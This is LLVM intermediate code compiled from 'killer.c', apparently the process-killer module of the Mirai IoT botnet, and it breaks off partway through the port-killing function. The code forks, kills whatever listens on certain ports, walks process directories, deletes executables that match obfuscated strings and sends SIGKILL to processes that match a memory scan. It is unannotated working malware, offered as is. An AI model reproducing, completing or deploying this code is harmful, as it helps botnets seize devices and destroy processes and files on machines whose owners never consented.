; ModuleID = 'killer.c'
source_filename = "killer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__dirstream = type opaque
%struct.dirent = type { i64, i64, i16, i8, [256 x i8] }

@killer_realpath_len = dso_local global i32 0, align 4
@killer_pid = dso_local global i32 0, align 4
@killer_realpath = dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killer_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__dirstream*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [64 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [4096 x i8], align 16
  %11 = alloca [64 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 400, i32* %1, align 4
  %16 = call i64 @time(i64* null) #6
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %2, align 4
  store i32 0, i32* %4, align 4
  %18 = call i32 @fork() #6
  store i32 %18, i32* @killer_pid, align 4
  %19 = load i32, i32* @killer_pid, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %24, label %21

21:                                               ; preds = %0
  %22 = load i32, i32* @killer_pid, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

24:                                               ; preds = %21, %0
  br label %212

25:                                               ; preds = %21
  %26 = call i32 @sleep(i32 5)
  %27 = call noalias align 16 i8* @malloc(i64 4096) #6
  store i8* %27, i8** @killer_realpath, align 8
  %28 = load i8*, i8** @killer_realpath, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 0
  store i8 0, i8* %29, align 1
  store i32 0, i32* @killer_realpath_len, align 4
  %30 = call signext i8 @has_exe_access()
  %31 = icmp ne i8 %30, 0
  br i1 %31, label %33, label %32

32:                                               ; preds = %25
  br label %212

33:                                               ; preds = %25
  br label %34

34:                                               ; preds = %33, %209
  call void @table_unlock_val(i8 zeroext 13)
  %35 = call i8* @table_retrieve_val(i32 13, i32* null)
  %36 = call %struct.__dirstream* @opendir(i8* %35)
  store %struct.__dirstream* %36, %struct.__dirstream** %6, align 8
  %37 = icmp eq %struct.__dirstream* %36, null
  br i1 %37, label %38, label %39

38:                                               ; preds = %34
  br label %212

39:                                               ; preds = %34
  call void @table_lock_val(i8 zeroext 13)
  %40 = call zeroext i16 @htons(i16 zeroext -17435) #7
  %41 = call signext i8 @killer_kill_by_port(i16 zeroext %40)
  %42 = icmp ne i8 %41, 0
  br i1 %42, label %43, label %44

43:                                               ; preds = %39
  br label %44

44:                                               ; preds = %43, %39
  %45 = call zeroext i16 @htons(i16 zeroext 1991) #7
  %46 = call signext i8 @killer_kill_by_port(i16 zeroext %45)
  %47 = icmp ne i8 %46, 0
  br i1 %47, label %48, label %49

48:                                               ; preds = %44
  br label %49

49:                                               ; preds = %48, %44
  %50 = call zeroext i16 @htons(i16 zeroext 1338) #7
  %51 = call signext i8 @killer_kill_by_port(i16 zeroext %50)
  %52 = icmp ne i8 %51, 0
  br i1 %52, label %53, label %54

53:                                               ; preds = %49
  br label %54

54:                                               ; preds = %53, %49
  br label %55

55:                                               ; preds = %205, %187, %103, %73, %54
  %56 = load %struct.__dirstream*, %struct.__dirstream** %6, align 8
  %57 = call %struct.dirent* @readdir(%struct.__dirstream* %56)
  store %struct.dirent* %57, %struct.dirent** %7, align 8
  %58 = icmp ne %struct.dirent* %57, null
  br i1 %58, label %59, label %209

59:                                               ; preds = %55
  %60 = load %struct.dirent*, %struct.dirent** %7, align 8
  %61 = getelementptr inbounds %struct.dirent, %struct.dirent* %60, i32 0, i32 4
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %61, i64 0, i64 0
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp slt i32 %64, 48
  br i1 %65, label %73, label %66

66:                                               ; preds = %59
  %67 = load %struct.dirent*, %struct.dirent** %7, align 8
  %68 = getelementptr inbounds %struct.dirent, %struct.dirent* %67, i32 0, i32 4
  %69 = getelementptr inbounds [256 x i8], [256 x i8]* %68, i64 0, i64 0
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp sgt i32 %71, 57
  br i1 %72, label %73, label %74

73:                                               ; preds = %66, %59
  br label %55, !llvm.loop !6

74:                                               ; preds = %66
  %75 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  store i8* %75, i8** %9, align 8
  %76 = getelementptr inbounds [64 x i8], [64 x i8]* %11, i64 0, i64 0
  store i8* %76, i8** %12, align 8
  %77 = load %struct.dirent*, %struct.dirent** %7, align 8
  %78 = getelementptr inbounds %struct.dirent, %struct.dirent* %77, i32 0, i32 4
  %79 = getelementptr inbounds [256 x i8], [256 x i8]* %78, i64 0, i64 0
  %80 = call i32 @atoi(i8* %79) #8
  store i32 %80, i32* %15, align 4
  %81 = load i32, i32* %4, align 4
  %82 = add i32 %81, 1
  store i32 %82, i32* %4, align 4
  %83 = load i32, i32* %15, align 4
  %84 = load i32, i32* %1, align 4
  %85 = icmp sle i32 %83, %84
  br i1 %85, label %86, label %104

86:                                               ; preds = %74
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %90 = sub nsw i64 %87, %89
  %91 = icmp sgt i64 %90, 600
  br i1 %91, label %92, label %93

92:                                               ; preds = %86
  store i32 400, i32* %1, align 4
  br label %103

93:                                               ; preds = %86
  %94 = load i32, i32* %15, align 4
  %95 = icmp sgt i32 %94, 400
  br i1 %95, label %96, label %102

96:                                               ; preds = %93
  %97 = load i32, i32* %4, align 4
  %98 = urem i32 %97, 10
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %102

100:                                              ; preds = %96
  %101 = call i32 @sleep(i32 1)
  br label %102

102:                                              ; preds = %100, %96, %93
  br label %103

103:                                              ; preds = %102, %92
  br label %55, !llvm.loop !6

104:                                              ; preds = %74
  %105 = load i32, i32* %15, align 4
  %106 = load i32, i32* %1, align 4
  %107 = icmp sgt i32 %105, %106
  br i1 %107, label %108, label %110

108:                                              ; preds = %104
  %109 = load i32, i32* %15, align 4
  store i32 %109, i32* %1, align 4
  br label %110

110:                                              ; preds = %108, %104
  %111 = call i64 @time(i64* null) #6
  %112 = trunc i64 %111 to i32
  store i32 %112, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 13)
  call void @table_unlock_val(i8 zeroext 14)
  %113 = load i8*, i8** %9, align 8
  %114 = call i8* @table_retrieve_val(i32 13, i32* null)
  %115 = call i32 @util_strcpy(i8* %113, i8* %114)
  %116 = load i8*, i8** %9, align 8
  %117 = sext i32 %115 to i64
  %118 = getelementptr inbounds i8, i8* %116, i64 %117
  store i8* %118, i8** %9, align 8
  %119 = load i8*, i8** %9, align 8
  %120 = load %struct.dirent*, %struct.dirent** %7, align 8
  %121 = getelementptr inbounds %struct.dirent, %struct.dirent* %120, i32 0, i32 4
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %121, i64 0, i64 0
  %123 = call i32 @util_strcpy(i8* %119, i8* %122)
  %124 = load i8*, i8** %9, align 8
  %125 = sext i32 %123 to i64
  %126 = getelementptr inbounds i8, i8* %124, i64 %125
  store i8* %126, i8** %9, align 8
  %127 = load i8*, i8** %9, align 8
  %128 = call i8* @table_retrieve_val(i32 14, i32* null)
  %129 = call i32 @util_strcpy(i8* %127, i8* %128)
  %130 = load i8*, i8** %9, align 8
  %131 = sext i32 %129 to i64
  %132 = getelementptr inbounds i8, i8* %130, i64 %131
  store i8* %132, i8** %9, align 8
  %133 = load i8*, i8** %12, align 8
  %134 = call i8* @table_retrieve_val(i32 13, i32* null)
  %135 = call i32 @util_strcpy(i8* %133, i8* %134)
  %136 = load i8*, i8** %12, align 8
  %137 = sext i32 %135 to i64
  %138 = getelementptr inbounds i8, i8* %136, i64 %137
  store i8* %138, i8** %12, align 8
  %139 = load i8*, i8** %12, align 8
  %140 = load %struct.dirent*, %struct.dirent** %7, align 8
  %141 = getelementptr inbounds %struct.dirent, %struct.dirent* %140, i32 0, i32 4
  %142 = getelementptr inbounds [256 x i8], [256 x i8]* %141, i64 0, i64 0
  %143 = call i32 @util_strcpy(i8* %139, i8* %142)
  %144 = load i8*, i8** %12, align 8
  %145 = sext i32 %143 to i64
  %146 = getelementptr inbounds i8, i8* %144, i64 %145
  store i8* %146, i8** %12, align 8
  %147 = load i8*, i8** %12, align 8
  %148 = call i8* @table_retrieve_val(i32 29, i32* null)
  %149 = call i32 @util_strcpy(i8* %147, i8* %148)
  %150 = load i8*, i8** %12, align 8
  %151 = sext i32 %149 to i64
  %152 = getelementptr inbounds i8, i8* %150, i64 %151
  store i8* %152, i8** %12, align 8
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  %153 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %154 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %155 = call i64 @readlink(i8* %153, i8* %154, i64 4095) #6
  %156 = trunc i64 %155 to i32
  store i32 %156, i32* %13, align 4
  %157 = icmp ne i32 %156, -1
  br i1 %157, label %158, label %198

158:                                              ; preds = %110
  %159 = load i32, i32* %13, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %160
  store i8 0, i8* %161, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %162 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %163 = load i32, i32* %13, align 4
  %164 = sub nsw i32 %163, 1
  %165 = call i8* @table_retrieve_val(i32 30, i32* null)
  %166 = call i32 @util_stristr(i8* %162, i32 %164, i8* %165)
  %167 = icmp ne i32 %166, -1
  br i1 %167, label %168, label %173

168:                                              ; preds = %158
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %170 = call i32 @unlink(i8* %169) #6
  %171 = load i32, i32* %15, align 4
  %172 = call i32 @kill(i32 %171, i32 9) #6
  br label %173

173:                                              ; preds = %168, %158
  call void @table_lock_val(i8 zeroext 30)
  %174 = load i32, i32* %15, align 4
  %175 = call i32 @getpid() #6
  %176 = icmp eq i32 %174, %175
  br i1 %176, label %187, label %177

177:                                              ; preds = %173
  %178 = load i32, i32* %15, align 4
  %179 = call i32 @getppid() #6
  %180 = icmp eq i32 %178, %179
  br i1 %180, label %187, label %181

181:                                              ; preds = %177
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %183 = load i8*, i8** @killer_realpath, align 8
  %184 = call signext i8 @util_strcmp(i8* %182, i8* %183)
  %185 = sext i8 %184 to i32
  %186 = icmp ne i32 %185, 0
  br i1 %186, label %187, label %188

187:                                              ; preds = %181, %177, %173
  br label %55, !llvm.loop !6

188:                                              ; preds = %181
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %190 = call i32 (i8*, i32, ...) @open(i8* %189, i32 0)
  store i32 %190, i32* %14, align 4
  %191 = icmp eq i32 %190, -1
  br i1 %191, label %192, label %195

192:                                              ; preds = %188
  %193 = load i32, i32* %15, align 4
  %194 = call i32 @kill(i32 %193, i32 9) #6
  br label %195

195:                                              ; preds = %192, %188
  %196 = load i32, i32* %14, align 4
  %197 = call i32 @close(i32 %196)
  br label %198

198:                                              ; preds = %195, %110
  %199 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %200 = call signext i8 @memory_scan_match(i8* %199)
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %205

202:                                              ; preds = %198
  %203 = load i32, i32* %15, align 4
  %204 = call i32 @kill(i32 %203, i32 9) #6
  br label %205

205:                                              ; preds = %202, %198
  %206 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  call void @util_zero(i8* %206, i32 64)
  %207 = getelementptr inbounds [64 x i8], [64 x i8]* %11, i64 0, i64 0
  call void @util_zero(i8* %207, i32 64)
  %208 = call i32 @sleep(i32 1)
  br label %55, !llvm.loop !6

209:                                              ; preds = %55
  %210 = load %struct.__dirstream*, %struct.__dirstream** %6, align 8
  %211 = call i32 @closedir(%struct.__dirstream* %210)
  br label %34

212:                                              ; preds = %24, %32, %38
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @fork() #1

declare i32 @sleep(i32) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @has_exe_access() #0 {
  %1 = alloca i8, align 1
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca [16 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  store i8* %7, i8** %3, align 8
  call void @table_unlock_val(i8 zeroext 13)
  call void @table_unlock_val(i8 zeroext 14)
  %8 = load i8*, i8** %3, align 8
  %9 = call i8* @table_retrieve_val(i32 13, i32* null)
  %10 = call i32 @util_strcpy(i8* %8, i8* %9)
  %11 = load i8*, i8** %3, align 8
  %12 = sext i32 %10 to i64
  %13 = getelementptr inbounds i8, i8* %11, i64 %12
  store i8* %13, i8** %3, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getpid() #6
  %16 = getelementptr inbounds [16 x i8], [16 x i8]* %4, i64 0, i64 0
  %17 = call i8* @util_itoa(i32 %15, i32 10, i8* %16)
  %18 = call i32 @util_strcpy(i8* %14, i8* %17)
  %19 = load i8*, i8** %3, align 8
  %20 = sext i32 %18 to i64
  %21 = getelementptr inbounds i8, i8* %19, i64 %20
  store i8* %21, i8** %3, align 8
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @table_retrieve_val(i32 14, i32* null)
  %24 = call i32 @util_strcpy(i8* %22, i8* %23)
  %25 = load i8*, i8** %3, align 8
  %26 = sext i32 %24 to i64
  %27 = getelementptr inbounds i8, i8* %25, i64 %26
  store i8* %27, i8** %3, align 8
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %29 = call i32 (i8*, i32, ...) @open(i8* %28, i32 0)
  store i32 %29, i32* %5, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %32

31:                                               ; preds = %0
  store i8 0, i8* %1, align 1
  br label %53

32:                                               ; preds = %0
  %33 = load i32, i32* %5, align 4
  %34 = call i32 @close(i32 %33)
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %36 = load i8*, i8** @killer_realpath, align 8
  %37 = call i64 @readlink(i8* %35, i8* %36, i64 4095) #6
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %6, align 4
  %39 = icmp ne i32 %38, -1
  br i1 %39, label %40, label %45

40:                                               ; preds = %32
  %41 = load i8*, i8** @killer_realpath, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  store i8 0, i8* %44, align 1
  br label %45

45:                                               ; preds = %40, %32
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %47 = load i8*, i8** %3, align 8
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %49 = ptrtoint i8* %47 to i64
  %50 = ptrtoint i8* %48 to i64
  %51 = sub i64 %49, %50
  %52 = trunc i64 %51 to i32
  call void @util_zero(i8* %46, i32 %52)
  store i8 1, i8* %1, align 1
  br label %53

53:                                               ; preds = %45, %31
  %54 = load i8, i8* %1, align 1
  ret i8 %54
}

declare void @table_unlock_val(i8 zeroext) #2

declare %struct.__dirstream* @opendir(i8*) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare void @table_lock_val(i8 zeroext) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local signext i8 @killer_kill_by_port(i16 zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i16, align 2
  %4 = alloca %struct.__dirstream*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = alloca %struct.dirent*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca [513 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [16 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [16 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  store i16 %0, i16* %3, align 2
  %24 = bitcast [4096 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %24, i8 0, i64 4096, i1 false)
  %25 = bitcast [4096 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 4096, i1 false)
  %26 = bitcast [513 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %26, i8 0, i64 513, i1 false)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %27 = bitcast [16 x i8]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %27, i8 0, i64 16, i1 false)
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %28, i8** %14, align 8
  store i32 0, i32* %15, align 4
  %29 = load i16, i16* %3, align 2
  %30 = call zeroext i16 @ntohs(i16 zeroext %29) #7
  %31 = zext i16 %30 to i32
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %33 = call i8* @util_itoa(i32 %31, i32 16, i8* %32)
  %34 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %35 = call i32 @util_strlen(i8* %34)
  %36 = icmp eq i32 %35, 2
  br i1 %36, label %37, label %47

37:                                               ; preds = %1
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %39 = load i8, i8* %38, align 16
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 2
  store i8 %39, i8* %40, align 2
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 3
  store i8 %42, i8* %43, align 1
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 4
  store i8 0, i8* %44, align 4
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %45, align 16
  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  store i8 48, i8* %46, align 1
  br label %47

47:                                               ; preds = %37, %1
  call void @table_unlock_val(i8 zeroext 13)
  call void @table_unlock_val(i8 zeroext 14)
  call void @table_unlock_val(i8 zeroext 15)
  call void @table_unlock_val(i8 zeroext 17)
  %48 = call i8* @table_retrieve_val(i32 17, i32* null)
  %49 = call i32 (i8*, i32, ...) @open(i8* %48, i32 0)
  store i32 %49, i32* %12, align 4
  %50 = load i32, i32* %12, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %47
  store i8 0, i8* %2, align 1
  br label %375

53:                                               ; preds = %47
  br label %54

54:                                               ; preds = %222, %215, %184, %86, %53
  %55 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 0
  %56 = load i32, i32* %12, align 4
  %57 = call i8* @util_fdgets(i8* %55, i32 512, i32 %56)
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %223

59:                                               ; preds = %54
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %60

60:                                               ; preds = %76, %59
  %61 = load i32, i32* %17, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %74

67:                                               ; preds = %60
  %68 = load i32, i32* %17, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp ne i32 %72, 58
  br label %74

74:                                               ; preds = %67, %60
  %75 = phi i1 [ false, %60 ], [ %73, %67 ]
  br i1 %75, label %76, label %79

76:                                               ; preds = %74
  %77 = load i32, i32* %17, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %17, align 4
  br label %60, !llvm.loop !8

79:                                               ; preds = %74
  %80 = load i32, i32* %17, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %87

86:                                               ; preds = %79
  br label %54, !llvm.loop !9

87:                                               ; preds = %79
  %88 = load i32, i32* %17, align 4
  %89 = add nsw i32 %88, 2
  store i32 %89, i32* %17, align 4
  %90 = load i32, i32* %17, align 4
  store i32 %90, i32* %18, align 4
  br label %91

91:                                               ; preds = %107, %87
  %92 = load i32, i32* %17, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %105

98:                                               ; preds = %91
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp ne i32 %103, 32
  br label %105

105:                                              ; preds = %98, %91
  %106 = phi i1 [ false, %91 ], [ %104, %98 ]
  br i1 %106, label %107, label %110

107:                                              ; preds = %105
  %108 = load i32, i32* %17, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %17, align 4
  br label %91, !llvm.loop !10

110:                                              ; preds = %105
  %111 = load i32, i32* %17, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %17, align 4
  %113 = sext i32 %111 to i64
  %114 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %113
  store i8 0, i8* %114, align 1
  %115 = load i32, i32* %18, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %116
  %118 = load i32, i32* %18, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %119
  %121 = call i32 @util_strlen(i8* %120)
  %122 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %123 = call i32 @util_stristr(i8* %117, i32 %121, i8* %122)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %125, label %222

125:                                              ; preds = %110
  store i32 0, i32* %19, align 4
  store i8 0, i8* %20, align 1
  store i8 0, i8* %21, align 1
  br label %126

126:                                              ; preds = %178, %125
  %127 = load i32, i32* %19, align 4
  %128 = icmp slt i32 %127, 7
  br i1 %128, label %129, label %137

129:                                              ; preds = %126
  %130 = load i32, i32* %17, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %17, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = icmp ne i32 %135, 0
  br label %137

137:                                              ; preds = %129, %126
  %138 = phi i1 [ false, %126 ], [ %136, %129 ]
  br i1 %138, label %139, label %179

139:                                              ; preds = %137
  %140 = load i32, i32* %17, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %141
  %143 = load i8, i8* %142, align 1
  %144 = sext i8 %143 to i32
  %145 = icmp eq i32 %144, 32
  br i1 %145, label %153, label %146

146:                                              ; preds = %139
  %147 = load i32, i32* %17, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = icmp eq i32 %151, 9
  br i1 %152, label %153, label %154

153:                                              ; preds = %146, %139
  store i8 1, i8* %20, align 1
  br label %178

154:                                              ; preds = %146
  %155 = load i8, i8* %20, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp eq i32 %156, 1
  br i1 %157, label %158, label %161

158:                                              ; preds = %154
  %159 = load i32, i32* %19, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %19, align 4
  br label %161

161:                                              ; preds = %158, %154
  %162 = load i8, i8* %20, align 1
  %163 = sext i8 %162 to i32
  %164 = icmp eq i32 %163, 1
  br i1 %164, label %165, label %177

165:                                              ; preds = %161
  %166 = load i32, i32* %19, align 4
  %167 = icmp eq i32 %166, 1
  br i1 %167, label %168, label %177

168:                                              ; preds = %165
  %169 = load i32, i32* %17, align 4
  %170 = add nsw i32 %169, 1
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 65
  br i1 %175, label %176, label %177

176:                                              ; preds = %168
  store i8 1, i8* %21, align 1
  br label %177

177:                                              ; preds = %176, %168, %165, %161
  store i8 0, i8* %20, align 1
  br label %178

178:                                              ; preds = %177, %153
  br label %126, !llvm.loop !11

179:                                              ; preds = %137
  %180 = load i32, i32* %17, align 4
  store i32 %180, i32* %18, align 4
  %181 = load i8, i8* %21, align 1
  %182 = sext i8 %181 to i32
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %185

184:                                              ; preds = %179
  br label %54, !llvm.loop !9

185:                                              ; preds = %179
  br label %186

186:                                              ; preds = %202, %185
  %187 = load i32, i32* %17, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %188
  %190 = load i8, i8* %189, align 1
  %191 = sext i8 %190 to i32
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %193, label %200

193:                                              ; preds = %186
  %194 = load i32, i32* %17, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %195
  %197 = load i8, i8* %196, align 1
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 32
  br label %200

200:                                              ; preds = %193, %186
  %201 = phi i1 [ false, %186 ], [ %199, %193 ]
  br i1 %201, label %202, label %205

202:                                              ; preds = %200
  %203 = load i32, i32* %17, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %17, align 4
  br label %186, !llvm.loop !12

205:                                              ; preds = %200
  %206 = load i32, i32* %17, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %17, align 4
  %208 = sext i32 %206 to i64
  %209 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %208
  store i8 0, i8* %209, align 1
  %210 = load i32, i32* %18, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %211
  %213 = call i32 @util_strlen(i8* %212)
  %214 = icmp sgt i32 %213, 15
  br i1 %214, label %215, label %216

215:                                              ; preds = %205
  br label %54, !llvm.loop !9

216:                                              ; preds = %205
  %217 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %218 = load i32, i32* %18, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %219
  %221 = call i32 @util_strcpy(i8* %217, i8* %220)
  br label %223

222:                                              ; preds = %110
  br label %54, !llvm.loop !9

223:                                              ; preds = %216, %54
  %224 = load i32, i32* %12, align 4
  %225 = call i32 @close(i32 %224)
  %226 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %227 = call i32 @util_strlen(i8* %226)
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %230

229:                                              ; preds = %223
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  call void @table_lock_val(i8 zeroext 15)
  call void @table_lock_val(i8 zeroext 17)
  store i8 0, i8* %2, align 1
  br label %375

230:                                              ; preds = %223
  %231 = call i8* @table_retrieve_val(i32 13, i32* null)
  %232 = call %struct.__dirstream* @opendir(i8* %231)
  store %struct.__dirstream* %232, %struct.__dirstream** %4, align 8
  %233 = icmp ne %struct.__dirstream* %232, null
  br i1 %233, label %234, label %371

234:                                              ; preds = %230
